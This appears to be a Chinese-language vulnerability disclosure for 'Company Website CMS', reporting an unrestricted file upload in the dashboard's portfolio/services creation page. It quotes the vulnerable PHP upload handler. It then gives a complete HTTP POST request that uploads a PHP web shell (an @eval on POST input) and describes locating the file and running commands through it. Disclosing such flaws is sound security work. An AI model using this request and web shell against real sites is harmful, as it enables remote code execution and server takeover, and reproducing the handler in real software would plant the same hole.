# Company Website CMS

Company Website CMS在创建/dashboard/Services页面，后端代码无限制，导致任意文件上传漏洞。

后端代码为：

```php
$uploads_dir = 'uploads/services';

        $tmp_name = $_FILES["ufile"]["tmp_name"];
        // basename() may prevent filesystem traversal attacks;
        // further validation/sanitation of the filename may be appropriate
        $name = basename($_FILES["ufile"]["name"]);
        $random_digit=rand(0000,9999);
        $new_file_name=$random_digit.$name;

        move_uploaded_file($tmp_name, "$uploads_dir/$new_file_name");
```

可以看出是一个无限制的文件上传，只有文件名被随机值拼接然后移动。

上传页面为：

![image-20250309181419184](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092153234.png)

使用payload如下：

```
POST /vogue/dashboard/createportfolio HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Length: 839
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/vogue/dashboard/createportfolio
Cookie: PHPSESSID=8udk6re20tpda96ncs7of8bb94
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="port_title"

file upload text
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="port_desc"

texttexttexttexttexttexttexttexttext
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="port_detail"

texttexttexttexttexttexttexttexttexttexttext
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="ufile"; filename="text.php"
Content-Type: application/octet-stream

<?php echo "123"; @eval($_POST[123]); ?>
------geckoformboundaryafbda5700eee89a77231823337f34d28
Content-Disposition: form-data; name="save"


------geckoformboundaryafbda5700eee89a77231823337f34d28--
```

成功上传：

![image-20250309215400638](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092154671.png)

然后在前台看到如下内容：

![image-20250309215418060](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092154106.png)

点进可以看到文件的引入，成功拿到文件名：

![image-20250309181512766](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092154156.png)

拿到文件名，然后访问就可以进行命令执行：

![image-20250309181803933](https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503092154258.png)

————————